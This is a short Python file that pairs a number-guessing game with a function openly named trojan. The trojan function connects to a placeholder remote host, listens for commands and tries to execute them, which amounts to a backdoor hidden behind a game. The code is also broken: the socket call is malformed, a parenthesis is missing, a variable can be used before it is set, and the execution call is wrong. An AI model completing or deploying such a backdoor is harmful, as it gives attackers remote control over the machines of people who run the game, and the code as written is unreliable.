import socket
import random
import threading
import os

def game():

	number = random.randint(0,10)

	tries = 1

	done = False

	while not done:
		guess = input('Your number: ')

		if guess.isdigit():
			guess = int(guess)

			if guess == number:
				done = True 
				print('You Win')
			else:
				tries += 1
				if guess > number:
					print('<')
				else:
					print('>')
		else:
			print('your nomber not in range 0,10')

def trojan():
	HOST = 'ip'
	PORT = 9090

	client = socket.socket(socket.AF_INET.socket.SOCK_STREAM)
	client.connect((HOST,PORT))

	while True:
		server_command = client.recv(1024).decode('cp866')

		if server_command == 'cmdon':
			cmd_mode = True
			client.send('you have sucsess'.encode('cp866'))
			continue
		if server_command == 'cmdoff':
			cmd_mode = False
		if cmd_mode:
			os.open(server_command)
		else:
			if server_command == 'hello':
				print('Hello World!')
		client.send(f'{server_command} all is good!'.encode('cp866')